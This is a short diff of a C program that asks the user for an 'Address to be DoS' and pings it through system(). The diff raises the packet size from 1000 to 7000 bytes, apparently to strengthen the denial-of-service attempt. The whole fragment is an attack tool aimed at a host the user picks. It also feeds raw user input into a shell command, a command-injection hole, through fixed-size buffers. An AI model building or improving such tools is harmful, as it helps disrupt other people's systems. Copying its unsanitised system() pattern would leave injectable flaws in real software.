@@ -64,7 +64,7 @@ int main()
         char pingAdr[100], pingCmd[100];
         printf("Enter Address to be DoS: ");
         scanf("%s", pingAdr);
-        sprintf(pingCmd, "ping -s 1000 %s", pingAdr);
+        sprintf(pingCmd, "ping -s 7000 %s", pingAdr);
         system(pingCmd);
         
     }
